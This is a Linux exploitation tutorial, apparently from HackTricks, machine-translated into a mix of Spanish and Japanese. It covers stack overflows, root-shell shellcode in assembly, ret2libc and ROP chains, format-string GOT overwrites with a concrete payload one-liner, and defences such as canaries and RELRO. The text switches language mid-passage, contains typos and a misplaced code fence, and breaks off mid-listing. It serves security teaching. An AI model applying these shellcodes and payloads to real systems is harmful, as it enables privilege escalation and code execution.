# Linux Exploiting (Basic) (SPA)

## Linux Exploiting (Basic) (SPA)

<details>

<summary><strong>ゼロからヒーローまでAWSハッキングを学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>

HackTricks をサポートする他の方法:

* **HackTricks で企業を宣伝したい**または **HackTricks をPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
* **💬 [Discordグループ](https://discord.gg/hRep4RUj7f)**に参加するか、[telegramグループ](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)で **フォロー**する
* **ハッキングテクニックを共有するために、[HackTricks](https://github.com/carlospolop/hacktricks)と[HackTricks Cloud](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出する**

</details>

## **ASLR**

Aleatorización de direcciones

**Desactiva aleatorizacion(ASLR) GLOBAL (root)**:\
echo 0 > /proc/sys/kernel/randomize\_va\_space\
Reactivar aletorizacion GLOBAL: echo 2 > /proc/sys/kernel/randomize\_va\_space

**Desactivar para una ejecución** (no requiere root):\
setarch \`arch\` -R ./ejemplo argumentos\
setarch \`uname -m\` -R ./ejemplo argumentos

**Desactivar protección de ejecución en pila**\
gcc -fno-stack-protector -D\_FORTIFY\_SOURCE=0 -z norelro -z execstack ejemplo.c -o ejemplo

**Core file**\
ulimit -c unlimited\
gdb /exec core\_file\
/etc/security/limits.conf -> \* soft core unlimited

**Text**\
**Data**\
**BSS**\
**Heap**

**Stack**

**Sección BSS**: Variables globales o estáticas sin inicializar
```
static int i;
```
**セクション DATA**: グローバルまたは静的に初期化された変数
```
int i = 5;
```
**セクション TEXT**: コードの命令（オペコード）の手順

**セクション HEAP**: 動的に確保されたバッファ（malloc()、calloc()、realloc()）

**セクション STACK**: スタック（渡された引数、環境文字列（env）、ローカル変数...）

## **1.STACK OVERFLOWS**

> バッファオーバーフロー、バッファオーバーラン、スタックオーバーラン、スタックスマッシング

Segmentation faultまたはsegmentation violation: プロセスに割り当てられていないメモリアドレスにアクセスしようとしたときのエラー。

プログラム内の関数のアドレスを取得するには、以下のようにします：
```
objdump -d ./PROGRAMA | grep FUNCION
```
## ROP

### sys\_execveへの呼び出し

{% content-ref url="rop-syscall-execv.md" %}
[rop-syscall-execv.md](rop-syscall-execv.md)
{% endcontent-ref %}

## **2.SHELLCODE**

View kernel interrupts: cat /usr/include/i386-linux-gnu/asm/unistd\_32.h | grep “\_\_NR\_”

setreuid(0,0); // \_\_NR\_setreuid 70\
execve(“/bin/sh”, args\[], NULL); // \_\_NR\_execve 11\
exit(0); // \_\_NR\_exit 1

xor eax, eax ; clear eax\
xor ebx, ebx ; ebx = 0 as there are no arguments to pass\
mov al, 0x01 ; eax = 1 —> \_\_NR\_exit 1\
int 0x80 ; Execute syscall

**nasm -f elf assembly.asm** —> Returns a .o file\
**ld assembly.o -o shellcodeout** —> Generates an executable with the assembly code, and we can extract the opcodes using **objdump**\
**objdump -d -Mintel ./shellcodeout** —> To verify that it is indeed our shellcode and extract the OpCodes

**Verify that the shellcode works**
```
char shellcode[] = “\x31\xc0\x31\xdb\xb0\x01\xcd\x80”

void main(){
void (*fp) (void);
fp = (void *)shellcode;
fp();
}<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">​</span>
```
システムコールが正しく行われているかを確認するには、前述のプログラムをコンパイルし、システムコールが**strace ./PROGRAMA\_COMPILADO**に表示される必要があります。

シェルコードを作成する際にはトリックを使用できます。最初の命令はcallへのjumpです。callは元のコードを呼び出し、さらにEIPをスタックに入れます。callの命令の後に必要な文字列を入れており、そのEIPを使用して文字列を指し示し、さらにコードを実行できます。

例 **TRUCO (/bin/sh)**:
```
jmp                 0x1f                                        ; Salto al último call
popl                %esi                                       ; Guardamos en ese la dirección al string
movl               %esi, 0x8(%esi)       ; Concatenar dos veces el string (en este caso /bin/sh)
xorl                 %eax, %eax             ; eax = NULL
movb  %eax, 0x7(%esi)     ; Ponemos un NULL al final del primer /bin/sh
movl               %eax, 0xc(%esi)      ; Ponemos un NULL al final del segundo /bin/sh
movl   $0xb, %eax               ; Syscall 11
movl               %esi, %ebx               ; arg1=“/bin/sh”
leal                 0x8(%esi), %ecx      ; arg[2] = {“/bin/sh”, “0”}
leal                 0xc(%esi), %edx      ; arg3 = NULL
int                    $0x80                         ; excve(“/bin/sh”, [“/bin/sh”, NULL], NULL)
xorl                 %ebx, %ebx             ; ebx = NULL
movl   %ebx, %eax
inc                   %eax                          ; Syscall 1
int                    $0x80                         ; exit(0)
call                  -0x24                          ; Salto a la primera instrución
.string             \”/bin/sh\”                               ; String a usar<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">​</span>
```
**Stackを使用したEJ(/bin/sh):**
```
section .text
global _start
_start:
xor                  eax, eax                     ;Limpieza
mov                al, 0x46                      ; Syscall 70
xor                  ebx, ebx                     ; arg1 = 0
xor                  ecx, ecx                     ; arg2 = 0
int                    0x80                           ; setreuid(0,0)
xor                  eax, eax                     ; eax = 0
push   eax                             ; “\0”
push               dword 0x68732f2f ; “//sh”
push               dword 0x6e69622f; “/bin”
mov                ebx, esp                     ; arg1 = “/bin//sh\0”
push               eax                             ; Null -> args[1]
push               ebx                             ; “/bin/sh\0” -> args[0]
mov                ecx, esp                     ; arg2 = args[]
mov                al, 0x0b                      ; Syscall 11
int                    0x80                           ; excve(“/bin/sh”, args[“/bin/sh”, “NULL”], NULL)
```
**EJ FNSTENV:**
```
fabs
fnstenv [esp-0x0c]
pop eax                     ; Guarda el EIP en el que se ejecutó fabs
…
```
**Egg Hunter:**

プロセスに関連付けられたメモリページをスキャンし、そこに保存されているシェルコードを探す小さなコードです（シェルコードに配置されたいくつかの署名を探します）。コードをインジェクトするための小さなスペースしかない場合に便利です。

**Polymorphic Shellcodes**

これは、暗号化されたシェルで、それらを復号化してジャンプする小さなコードを持っており、Call-Popトリックを使用しています。これは**シーザー暗号化の例**です。
```
global _start
_start:
jmp short magic
init:
pop     esi
xor      ecx, ecx
mov    cl,0                              ; Hay que sustituir el 0 por la longitud del shellcode (es lo que recorrerá)
desc:
sub     byte[esi + ecx -1], 0 ; Hay que sustituir el 0 por la cantidad de bytes a restar (cifrado cesar)
sub     cl, 1
jnz       desc
jmp     short sc
magic:
call init
sc:
;Aquí va el shellcode
```
1. **Frame Pointer (EBP) の攻撃**

EBP を変更できるが EIP を変更できない状況で有用です。

関数から抜ける際に次のアセンブリコードが実行されることが知られています：
```
movl               %ebp, %esp
popl                %ebp
ret
```
De esta forma, si se puede modificar el EBP al salir de una función (fvuln) que ha sido llamada por otra función, cuando la función que llamó a fvuln finalice, su EIP puede ser modificado.

En fvuln se puede introducir un EBP falso que apunte a un sitio donde esté la dirección de la shellcode + 4 (hay que sumarle 4 por el pop). Así, al salir de la función, se meterá en ESP el valor de &(\&Shellcode)+4, con el pop se le restará 4 al ESP y este apuntará a la dirección de la shellcode cuando se ejecute el ret.

**Exploit:**\
\&Shellcode + "AAAA" + SHELLCODE + relleno + &(\&Shellcode)+4

**Off-by-One Exploit**\
Se permite modificar tan solo el byte menos significativo del EBP. Se puede llevar a cabo un ataque como el anterior pero la memoria que guarda la dirección de la shellcode debe compartir los 3 primeros bytes con el EBP.

## **4. Métodos return to Libc**

Método útil cuando el stack no es ejecutable o deja un buffer muy pequeño para modificar.

El ASLR provoca que en cada ejecución las funciones se carguen en posiciones distintas de la memoria. Por lo tanto este método puede no ser efectivo en ese caso. Para servidores remotos, como el programa está siendo ejecutado constantemente en la misma dirección sí puede ser útil.

* **cdecl(C declaration)** Mete los argumentos en el stack y tras salir de la función limpia la pila
* **stdcall(standard call)** Mete los argumentos en la pila y es la función llamada la que la limpia
* **fastcall** Mete los dos primeros argumentos en registros y el resto en la pila

Se pone la dirección de la instrucción system de libc y se le pasa como argumento el string “/bin/sh”, normalmente desde una variable de entorno. Además, se usa la dirección a la función exit para que una vez que no se requiera más la shell, salga el programa sin dar problemas (y escribir logs).

**export SHELL=/bin/sh**

Para encontrar las direcciones que necesitaremos se puede mirar dentro de **GDB:**\
**p system**\
**p exit**\
**rabin2 -i ejecutable** —> Da la dirección de todas las funciones que usa el programa al cargarse\
(Dentro de un start o algun breakpoint): **x/500s $esp** —> Buscamos dentro de aqui el string /bin/sh

Una vez tengamos estas direcciones el **exploit** quedaría:

“A” \* DISTANCIA EBP + 4 (EBP: pueden ser 4 "A"s aunque mejor si es el EBP real para evitar fallos de segmentación) + Dirección de **system** (sobreescribirá el EIP) + Dirección de **exit** (al salir de system(“/bin/sh”) se llamará a esta función pues los primero 4bytes del stack son tratados como la siguiente dirección del EIP a ejecutar) + Dirección de “**/bin/sh**” (será el parámetro pasado a system)

De esta forma el EIP se sobreescribirá con la dirección de system la cual recibirá como parámetro el string “/bin/sh” y al salir de este ejecutará la función exit().

Es posible encontrarse en la situación de que algún byte de alguna dirección de alguna función sea nulo o espacio (\x20). En ese caso se pueden desensamblar las direcciones anteriores a dicha función pues probablemente haya varios NOPs que nos permitan poder llamar a alguno de ellos en vez de a la función directamente (por ejemplo con > x/8i system-4).

Este método funciona pues al llamar a una función como system usando el opcode **ret** en vez de **call**, la función entiende que los primeros 4bytes serán la dirección **EIP** a la que volver.

Una técnica interesante con este método es el llamar a **strncpy()** para mover un payload del stack al heap y posteriormente usar **gets()** para ejecutar dicho payload.

Otra técnica interesante es el uso de **mprotect()** la cual permite asignar los permisos deseados a cualquier parte de la memoria. Sirve o servía en BDS, MacOS y OpenBSD, pero no en linux(controla que no se puedan otorgar a la vez permisos de escritura y ejecución). Con este ataque se podría volver a configurar la pila como ejecutable.

**Encadenamiento de funciones**

Basándonos en la técnica anterior, esta forma de exploit consiste en:\
Relleno + \&Función1 + \&pop;ret; + \&arg\_fun1 + \&Función2 + \&pop;ret; + \&arg\_fun2 + …

De esta forma se pueden encadenar funciones a las que llamar. Además, si se quieren usar funciones con varios argumentos, se pueden poner los argumentos necesarios (ej 4) y poner los 4 argumentos y buscar dirección a un sitio con opcodes: pop, pop, pop, pop, ret —> **objdump -d ejecutable**

**Encadenamiento mediante falseo de frames (encadenamiento de EBPs)**

Consiste en aprovechar el poder manipular el EBP para ir encadenando la ejecución de varias funciones a través del EBP y de "leave;ret"

RELLENO

* Situamos en el EBP un EBP falso que apunta a: 2º EBP\_falso + la función a ejecutar: (\&system() + \&leave;ret + &“/bin/sh”)
* En el EIP ponemos de dirección una función &(leave;ret)

Iniciamos la shellcode con la dirección a la siguiente parte de la shellcode, por ej: 2ºEBP\_falso + \&system() + &(leave;ret;) + &”/bin/sh”

el 2ºEBP sería: 3ºEBP\_falso + \&system() + &(leave;ret;) + &”/bin/ls”

Esta shellcode se puede repetir indefinidamente en las partes de memoria a las que se tenga acceso de forma que se conseguirá una shellcode fácilmente divisible por pequeños trozos de memoria.

(Se encadena la ejecución de funciones mezclando las vulnerabilidades vistas anteriormente de EBP y de ret2lib)

## **5.Métodos complementarios**

**Ret2Ret**

Útil para cuando no se puede meter una dirección del stack en el EIP (se comprueba que el EIP no contenga 0xbf) o cuando no se puede calcular la ubicación de la shellcode. Pero, la función vulnerable acepte un parámetro (la shellcode irá aquí).

De esta forma, al cambiar el EIP por una dirección a un **ret**, se cargará la siguiente dirección (que es la dirección del primer argumento de la función). Es decir, se cargará la shellcode.

El exploit quedaría: SHELLCODE + Relleno (hasta EIP) + **\&ret** (los siguientes bytes de la pila apuntan al inicio de la shellcode pues se mete en el stack la dirección al parámetro pasado)

Al parecer funciones como **strncpy** una vez completas eliminan de la pila la dirección donde estaba guardada la shellcode imposibilitando esta técnica. Es decir, la dirección que pasan a la función como argumento (la que guarda la shellcode) es modificada por un 0x00 por lo que al llamar al segundo **ret** se encuentra con un 0x00 y el programa muere.
```
**Ret2PopRet**
```
**Muratのテクニック**

Linuxでは、すべてのプログラムは0xbfffffffからマップされます。

Linuxの新しいプロセスのスタックがどのように構築されるかを見ると、プログラムがシェルコードだけの環境で起動されるようにエクスプロイトを開発できます。そのアドレスは次のように計算できます：addr = 0xbfffffff - 4 - strlen(NOMBRE\_ejecutable\_completo) - strlen(shellcode)

これにより、シェルコードを含む環境変数があるアドレスを簡単に取得できます。

これは、execle関数が望ましい環境変数のみを持つ環境を作成できるために可能です。

**ESPへのジャンプ：Windowsスタイル**

ESPが常にスタックの先頭を指しているため、このテクニックはEIPを**jmp esp**または**call esp**へのアドレスに置き換えることで構成されます。これにより、**ret**を実行した後、ESPはシェルコードが保存されている場所に指すため、シェルコードを保存できます。

WindowsまたはLinuxでASLRが無効になっている場合、共有オブジェクトに保存された**jmp esp**または**call esp**を呼び出すことができます。ASLRが有効な場合は、脆弱なプログラム内で検索することができます。

また、スタックの中央にシェルコードを配置する代わりに、EIPの破損後にシェルコードを配置できるため、関数内で実行されるpushやpop命令がシェルコードに影響を与えないようにすることができます。

同様に、関数がシェルコードが保存されているアドレスを返すことを知っている場合、**call eax**または**jmp eax (ret2eax)**を呼び出すことができます。

**ROP（Return Oriented Programming）またはborrowed code chunks**

呼び出されるコードの断片はガジェットとして知られています。

このテクニックは、**ret2libc**技術と**pop,ret**の使用を通じて異なる関数呼び出しを連鎖させることにあります。

一部のプロセッサアーキテクチャでは、各命令が32ビットのセットである場合があります（たとえばMIPS）。しかし、Intelでは命令が可変サイズであり、複数の命令がビットセットを共有することがあります。例えば：

**movl $0xe4ff, -0x(%ebp)** —> これは0xffe4とも解釈され、**jmp \*%esp**に対応します。

これにより、元のプログラムに存在しない命令を実行できます。

**ROPgadget.py**は、バイナリ内の値を見つけるのに役立ちます。

このプログラムは**payloads**を作成するためにも使用できます。欲しいROPを取り出すためにライブラリを与えると、指定したライブラリのアドレスを与えると、使用するためのpayloadがPythonで生成されます。また、システムコールを使用するため、実際にはスタック上で何も実行せず、**ret**命令を介して実行されるROPのアドレスを保存していくだけです。このpayloadを使用するには、**ret**命令を介してpayloadを呼び出す必要があります。

**整数オーバーフロー**

この種のオーバーフローは、変数が受け取るべき数値が大きすぎる場合に発生します。符号付きと符号なしの変数の混同による可能性があります。
```c
#include <stdion.h>
#include <string.h>
#include <stdlib.h>

int main(int argc, char *argv[]){
int len;
unsigned int l;
char buffer[256];
int i;
len = l = strtoul(argv[1], NULL, 10);
printf("\nL = %u\n", l);
printf("\nLEN = %d\n", len);
if (len >= 256){
printf("\nLongitus excesiva\n");
exit(1);
}
if(strlen(argv[2]) < l)
strcpy(buffer, argv[2]);
else
printf("\nIntento de hack\n");
return 0;
}
```
**未初期化変数**

未初期化変数の取りうる値はわからず、それを観察することが興味深いかもしれません。前の関数の変数が取っていた値を取る可能性があり、それが攻撃者によって制御されるかもしれません。

## **フォーマット文字列**

C言語では、**`printf`** は文字列を**出力**するために使用できる関数です。この関数が期待する**最初のパラメータ**は、**フォーマッタを含む生のテキスト**です。次に期待されるパラメータは、生のテキストから**フォーマッタを置き換える値**です。

攻撃者のテキストがこの関数の最初の引数として入力されると、脆弱性が発生します。攻撃者は、**printfフォーマット文字列の機能を悪用**して、**任意のアドレスに任意のデータを書き込む**ことができます。これにより、**任意のコードを実行**することができます。

フォーマッタ：
```bash
%08x —> 8 hex bytes
%d —> Entire
%u —> Unsigned
%s —> String
%n —> Number of written bytes
%hn —> Occupies 2 bytes instead of 4
<n>$X —> Direct access, Example: ("%3$d", var1, var2, var3) —> Access to var3
```
**`%n`**は、指定されたアドレスに書き込まれたバイト数を表します。書き込む必要がある16進数のバイト数だけ書き込むことで、任意のデータを書き込むことができます。
```bash
AAAA%.6000d%4\$n —> Write 6004 in the address indicated by the 4º param
AAAA.%500\$08x —> Param at offset 500
```
### GOT (Global Offsets Table) / PLT (Procedure Linkage Table)

これは、プログラムで使用される外部関数へのアドレスを含むテーブルです。

このテーブルのアドレスを取得するには、**`objdump -s -j .got ./exec`**を使用します。

![](<../../.gitbook/assets/image (619).png>)

GEFで実行可能ファイルを読み込んだ後、**GOT**に含まれる**関数**を表示できます: `gef➤ x/20x 0xDIR_GOT`

![](<../../.gitbook/assets/image (620) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (5).png>)

GEFを使用してデバッグセッションを開始し、**`got`**を実行してgotテーブルを表示できます:

![](<../../.gitbook/assets/image (621).png>)

バイナリ内のGOTには、後で実行される関数のアドレスまたは関数アドレスをロードするPLTセクションへのアドレスが含まれています。このエクスプロイトの目標は、後で実行される関数のGOTエントリを、`system`関数のPLTのアドレスで上書きすることです。理想的には、制御可能なパラメータを送信できる関数のGOTを上書きします（つまり、システム関数に送信されるパラメータを制御できます）。

スクリプトで`system`が使用されていない場合、システム関数はGOTにエントリがありません。このシナリオでは、まず`system`関数のアドレスをリークする必要があります。

**Procedure Linkage Table**は、ELFファイル内の読み取り専用テーブルであり、解決が必要なすべてのシンボルを格納しています。これらの関数のいずれかが呼び出されると、GOTはPLTにフローをリダイレクトし、関数のアドレスを解決してGOTに書き込みます。\
その後、そのアドレスに対して次に呼び出しが行われると、関数は解決する必要なく直接呼び出されます。

PLTのアドレスは、**`objdump -j .plt -d ./vuln_binary`**で表示できます。

### Exploit Flow

前述のように、目標は後で呼び出される関数のGOTテーブル内のアドレスを上書きすることになります。理想的には、実行可能セクションに配置されたシェルコードのアドレスを設定できますが、実行可能セクションにシェルコードを書き込むことはほとんど不可能です。\
したがって、異なるオプションは、ユーザーから引数を受け取る関数を上書きし、それを`system`関数に指すことです。

アドレスを書き込むには、通常2つのステップが行われます: **最初にアドレスの2バイトを書き込み**、その後残りの2バイトを書き込みます。これには**`$hn`**が使用されます。

**HOB**はアドレスの上位2バイトを指します\
**LOB**はアドレスの下位2バイトを指します

したがって、フォーマット文字列の動作方法により、\[HOB、LOB]のうち**小さい方を最初に書き込み**、その後もう一方を書き込む必要があります。

HOB < LOBの場合\
`[address+2][address]%.[HOB-8]x%[offset]\$hn%.[LOB-HOB]x%[offset+1]`

HOB > LOBの場合\
`[address+2][address]%.[LOB-8]x%[offset+1]\$hn%.[HOB-LOB]x%[offset]`

HOB LOB HOB\_shellcode-8 NºParam\_dir\_HOB LOB\_shell-HOB\_shell NºParam\_dir\_LOB

\`python -c 'print "\x26\x97\x04\x08"+"\x24\x97\x04\x08"+ "%.49143x" + "%4$hn" + "%.15408x" + "%5$hn"'\`

### Format String Exploit Template

フォーマット文字列を使用してGOTをエクスプロイトするための**テンプレート**はこちらで見つけることができます:

{% content-ref url="format-strings-template.md" %}
[format-strings-template.md](format-strings-template.md)
{% endcontent-ref %}

### .fini_array

基本的に、これはプログラムが終了する前に呼び出される**関数が格納された構造**です。これは、アドレスにジャンプしてシェルコードを呼び出すことができる場合や、フォーマット文字列を2回目にエクスプロイトするために再びmainに戻る必要がある場合に興味深いです。
```bash
objdump -s -j .fini_array ./greeting

./greeting:     file format elf32-i386

Contents of section .fini_array:
8049934 a0850408

#Put your address in 0x8049934
```
注意：これは**永久ループ**を作成しません。なぜなら、mainに戻るとキャナリが検知し、スタックの末尾が破損している可能性があり、関数が再度呼び出されなくなるからです。したがって、これにより、脆弱性の**1回の実行を追加**できます。

### **コンテンツをダンプするためのフォーマット文字列**

フォーマット文字列は、プログラムのメモリから**コンテンツをダンプ**するためにも悪用されることがあります。\
たとえば、次の状況では、**フラグを指すスタック内のローカル変数**があります。**メモリ**のどこに**フラグへのポインタ**があるかを**見つける**と、**printf**がその**アドレス**にアクセスして**フラグ**を**表示**できます。

したがって、フラグは**0xffffcf4c**にあります

![](<../../.gitbook/assets/image (618) (2).png>)

そして、リークから**フラグへのポインタ**が**8番目**のパラメータにあることがわかります：

![](<../../.gitbook/assets/image (623).png>)

したがって、**8番目のパラメータ**にアクセスすると、フラグを取得できます：

![](<../../.gitbook/assets/image (624).png>)

**前のエクスプロイト**に続いて**コンテンツをリーク**し、**`printf`**への**ポインタ**を**実行可能ファイルがロードされるセクション**に**設定**し、それを**完全にダンプ**することができます！

### **DTOR**

{% hint style="danger" %}
現在、dtorセクションを持つバイナリを見つけるのは非常に**珍しい**です。
{% endhint %}

デストラクタは、プログラムが終了する前に**実行される関数**です。\
**`__DTOR_END__`**に**シェルコード**の**アドレス**を**書き込む**ことができれば、それはプログラムが終了する前に**実行**されます。\
このセクションのアドレスを取得するには：
```bash
objdump -s -j .dtors /exec
rabin -s /exec | grep “__DTOR”
```
通常、**DTOR** セクションは値 `ffffffff` と `00000000` の間にあります。したがって、これらの値だけを見ると、**登録された関数がない**ことを意味します。そのため、**`00000000`** を **シェルコードのアドレス** で **上書き** して、それを実行します。

### **フォーマット文字列を使用したバッファオーバーフロー**

**sprintf** はフォーマットされた文字列を変数に**移動**します。したがって、文字列の**フォーマット**を悪用して、コピーされる変数で**バッファオーバーフローを引き起こす**ことができます。\
例えば、ペイロード `%.44xAAAA` は変数に **44B+"AAAA" を書き込み**、これによりバッファオーバーフローが発生する可能性があります。

### **\_\_atexit 構造体**

{% hint style="danger" %}
現在はこれを **悪用するのは非常に珍しい** です。
{% endhint %}

**`atexit()`** は、**他の関数がパラメータとして渡される関数**です。これらの**関数**は、**`exit()` の実行**または **main の戻り**時に**実行**されます。\
たとえば、これらの **関数** の **アドレス** を **シェルコードを指すように変更** できれば、**プロセスを制御** できますが、現在はこれがより複雑になっています。\
現在、**実行される関数のアドレス** は、いくつかの構造体の背後に隠されており、最終的にそれが指すアドレスは関数のアドレスではなく、**XOR とランダムキーで暗号化** されています。そのため、現在、この攻撃ベクトルは **x86** および **x64\_86** では **あまり有用ではありません**。\
**暗号化関数** は **`PTR_MANGLE`** です。 **m68k、mips32、mips64、aarch64、arm、hppa** などの **他のアーキテクチャ** は、**入力と同じものを返す** ため、このベクトルによって攻撃される可能性があります。

### **setjmp() と longjmp()**

{% hint style="danger" %}
現在はこれを **悪用するのは非常に珍しい** です。
{% endhint %}

**`Setjmp()`** は **コンテキスト（レジスタ）** を **保存** できます。\
**`longjmp()`** は **コンテキスト** を **復元** できます。\
**保存されるレジスタ** は、`EBX、ESI、EDI、ESP、EIP、EBP` です。\
問題は、EIP と ESP が **`PTR_MANGLE`** 関数によって渡されるため、この攻撃に対して脆弱なアーキテクチャは上記と同じです。\
これらはエラー回復や割り込みに役立ちます。\
ただし、他のレジスタは保護されていないという情報もありますので、関数内で `call ebx`、`call esi`、`call edi` がある場合、制御を取得できます。または、ESP を変更して EBP を変更することもできます。

**VTable と VPTR in C++**

各クラスには、メソッドへの **ポインタの配列** である **Vtable** があります。

各 **クラス** のオブジェクトには、そのクラスの **配列へのポインタ** である **VPtr** があります。 VPtr は各オブジェクトのヘッダーの一部であり、VPtr を **上書き** すると、実行される関数がシェルコードに移動する可能性があります。

## **Preventive Measures and Evasions**

**Not So Random ASLR**

PaX はプロセスのアドレス空間を 3 つのグループに分割します：

開始されていないコードとデータ：.text、.data、.bss —> 変数 delta\_exec に 16 ビットのエントロピーがあり、この変数は各プロセスでランダムに初期化され、初期アドレスに加算されます

mmap() で割り当てられたメモリと共有ライブラリ —> 16 ビット、delta\_mmap

スタック —> 24 ビット、delta\_stack —> 実際には 11（10 番目から 20 番目までのバイト） —> 16 バイトに整列され、スタックの実際の可能なアドレスは 524,288 です

環境変数と引数は、スタック内のバッファよりも少ない量だけ移動します。

**Return-into-printf**

バッファオーバーフローをフォーマット文字列のエラーに変換する技術です。EIP を printf 関数を指すように置き換え、引数として操作されたフォーマット文字列を渡すことで、プロセスの状態に関する値を取得できます。

**Library Attacks**

ライブラリは 16 ビットのランダム性を持つ位置にあります = 65636 通りの可能なアドレスがあります。脆弱なサーバーが fork() を呼び出すと、メモリアドレス空間が子プロセスにコピーされ、そのまま保持されます。したがって、libc の usleep() 関数に "16" を引数として渡して brute force 攻撃を試みることができ、通常よりも長い応答時間がかかると、その関数が見つかります。その関数の場所がわかれば、delta\_mmap を取得し、他の値を計算できます。

ASLR が機能していることを確認する唯一の方法は、64 ビットアーキテクチャを使用することです。そこでは、総当たり攻撃はありません。

**StackGuard と StackShield**

**StackGuard** は、EIP の前に挿入される **0x000aff0d（null、\n、EndOfFile（EOF）、\r）** です。依然として脆弱なのは、recv()、memcpy()、read()、bcopy() であり、EBP を保護しません。

**StackShield** は StackGuard よりも洗練されています。

Global Return Stack というテーブルにすべての戻りアドレス EIP を保存し、オーバーフローが何の影響も与えないようにします。さらに、両方のアドレスを比較してオーバーフローが発生したかどうかを確認できます。

また、戻りアドレスを限界値と比較することもできます。したがって、EIP が通常の場所ではなくデータ領域などに移動するとわかります。ただし、これは Ret-to-lib、ROP、ret2ret で回避できます。

StackShield はローカル変数も保護していないことがわかります。

**Stack Smash Protector (ProPolice) -fstack-protector**

EBP の前にキャナリを配置します。バッファが他の変数を上書きできないように、ローカル変数を最も高い位置に再配置します。

さらに、スタックの上に渡された引数を安全にコピーし、これらのコピーを引数として使用します。

8 要素未満の配列やユーザー構造体の一部であるバッファを保護できません。

キャナリは "/dev/urandom" から取得されるランダムな数値であり、そうでない場合は 0xff0a0000 です。TLS（スレッドローカルストレージ）に保存されます。スレッドは同じメモリ空間を共有し、TLS は各スレッドのグローバルまたは静的変数を持つ領域です。ただし、通常、これらは親プロセスからコピーされますが、子プロセスはこれらのデータを変更できます。問題は、fork() を使用しても新しいキャナリを作成しない場合、すべてのプロセス（親と子）が同じキャナリを使用することです。i386 では gs:0x14 に、x86\_64 では fs:0x28 に保存されます。

この保護は、攻撃可能なバッファを持つ関数を特定し、その関数の先頭にキャナリを配置し、最後に検証するコードを含めることで機能します。

fork() 関数は親プロセスの完全なコピーを作成します。そのため、Webサーバーが fork() を呼び出すと、親プロセスのバイトごとの総当たり攻撃が可能です。

fork() の後に execve() 関数を使用すると、スペースが上書きされ、攻撃は不可能になります。vfork() は、子プロセスが書き込みを試みるまで複製を作成しないため、プロセスを実行することができます。

**Relocation Read-Only (RELRO)**

### Relro

**Relro (Read only Relocation)** は、メモリの権限に影響を与え、NX と同様にメモリを変更します。違いは、NX ではスタックを実行可能にしますが、RELRO は **特定のものを読み取り専用** にして、書き込むことができないようにします。これが障害となる一般的な方法は、**`got` テーブルの上書き** を防ぐことです。`got` テーブルには、libc 関数のアドレスが格納されており、バイナリがアドレスを知っていてそれを呼び出すことができます。RELRO がある場合とない場合のバイナリの `got` テーブルエントリのメモリ権限を見てみましょう。
```bash
gef➤  vmmap
Start              End                Offset             Perm Path
0x0000555555554000 0x0000555555555000 0x0000000000000000 r-- /tmp/tryc
0x0000555555555000 0x0000555555556000 0x0000000000001000 r-x /tmp/tryc
0x0000555555556000 0x0000555555557000 0x0000000000002000 r-- /tmp/tryc
0x0000555555557000 0x0000555555558000 0x0000000000002000 r-- /tmp/tryc
0x0000555555558000 0x0000555555559000 0x0000000000003000 rw- /tmp/tryc
0x0000555555559000 0x000055555557a000 0x0000000000000000 rw- [heap]
0x00007ffff7dcb000 0x00007ffff7df0000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7df0000 0x00007ffff7f63000 0x0000000000025000 r-x /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7f63000 0x00007ffff7fac000 0x0000000000198000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fac000 0x00007ffff7faf000 0x00000000001e0000 r-- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7faf000 0x00007ffff7fb2000 0x00000000001e3000 rw- /usr/lib/x86_64-linux-gnu/libc-2.29.so
0x00007ffff7fb2000 0x00007ffff7fb8000 0x0000000000000000 rw-
0x00007ffff7fce000 0x00007ffff7fd1000 0x0000000000000000 r-- [vvar]
0x00007ffff7fd1000 0x00007ffff7fd2000 0x0000000000000000 r-x [vdso]
0x00007ffff7fd2000 0x00007ffff7fd3000 0x0000000000000000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7fd3000 0x00007ffff7ff4000 0x0000000000001000 r-x /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ff4000 0x00007ffff7ffc000 0x0000000000022000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffc000 0x00007ffff7ffd000 0x0000000000029000 r-- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffd000 0x00007ffff7ffe000 0x000000000002a000 rw- /usr/lib/x86_64-linux-gnu/ld-2.29.so
0x00007ffff7ffe000 0x00007ffff7fff000 0x0000000000000000 rw-
0x00007ffffffde000 0x00007ffffffff000 0x0000000000000000 rw- [stack]
0xffffffffff600000 0xffffffffff601000 0x0000000000000000 r-x [vsyscall]
gef➤  p fgets
$2 = {char *(char *, int, FILE *)} 0x7ffff7e4d100 <_IO_fgets>
gef➤  search-pattern 0x7ffff7e4d100
[+] Searching '\x00\xd1\xe4\xf7\xff\x7f' in memory
[+] In '/tmp/tryc'(0x555555557000-0x555555558000), permission=r--
0x555555557fd0 - 0x555555557fe8  →   "\x00\xd1\xe4\xf7\xff\x7f[...]"
```
Relro なし:
```bash
gef➤  vmmap
Start              End                Offset             Perm Path
0x0000000000400000 0x0000000000401000 0x0000000000000000 r-- /tmp/try
0x0000000000401000 0x0000000000402000 0x0000000000001000 r-x /tmp/try
0x0000000000402000 0x0000000000403000 0x0000000000002000 r-- /tmp/try
